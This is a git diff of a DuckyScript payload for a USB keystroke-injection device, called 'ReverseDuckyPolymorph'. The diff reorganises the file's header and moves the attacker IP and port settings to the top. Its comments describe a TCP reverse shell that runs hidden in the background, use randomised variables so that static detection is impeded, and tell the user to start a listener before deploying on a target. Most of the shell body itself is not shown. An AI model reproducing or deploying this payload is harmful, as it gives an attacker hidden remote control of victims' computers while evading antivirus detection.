@@ -1,13 +1,19 @@
-REM       ReverseDuckyPolymorph
-REM       Version 1.0
-REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
-REM       Author: 0iphor13
-REM       Requirement: DuckyScript 3.0, PayloadStudio v. 1.3.0 minimum
+REM Title: ReverseDuckyPolymorph
+REM Author: 0iphor13
+REM Version 1.0
 
-REM       TCP Reverse shell executed hidden in the background, the CAPSLOCK light at the end will indicate that the payload was executed.
-REM       Because of randomisation static detection will be impeded
-REM       Define the attacker IP and PORT at line 39 & 40
-REM       DON'T FORGET TO START LISTENER
+REM Target: Windows / Linux(?) (Not tested with Powershell on Linux)
+REM Requirements: DuckyScript 3.0, PayloadStudio v. 1.3.0 minimum
+
+REM Description:
+REM TCP Reverse shell executed hidden in the background, 
+REM the CAPSLOCK light at the end will indicate that the payload was executed.
+REM Because of randomisation static detection will be impeded
+REM DON'T FORGET TO START LISTENER BEFORE DEPLOYING ON TARGET
+
+REM REQUIRED: Define the attackers IP & Port
+DEFINE ADDRESS '0.0.0.0'
+DEFINE PORT 4444
 
 REM Extension DETECT_READY by Korben for best and fastest deployment
 EXTENSION DETECT_READY
@@ -35,15 +41,11 @@ EXTENSION DETECT_READY
     CAPSLOCK
 END_EXTENSION
 
-REM Define the attackers IP & Port
-DEFINE ADDRESS '0.0.0.0'
-DEFINE PORT 4444
-
 REM Variables for pseudo random variables
-VAR $var_gibberish = $_RANDOM_INT 
+VAR $var_gibberish = $_RANDOM_NUMBER_KEYCODE
 VAR $var_gibberish2 = $_RANDOM_LETTER_KEYCODE 
 VAR $var_gibberish3 = $_RANDOM_LOWER_LETTER_KEYCODE 
-VAR $var_gibberish4 = $_RANDOM_CHAR_KEYCODE
+VAR $var_gibberish4 = $_RANDOM_LETTER_KEYCODE
 VAR $var_gibb3rish = $_RANDOM_NUMBER_KEYCODE
 VAR $var_duckID = $_RANDOM_UPPER_LETTER_KEYCODE
 VAR $var_duckID2 = $_RANDOM_NUMBER_KEYCODE
@@ -108,4 +110,3 @@ INJECT_VAR $var_gibb3rish
 STRINGLN .Close();exit
 DELAY 100
 CAPSLOCK
-
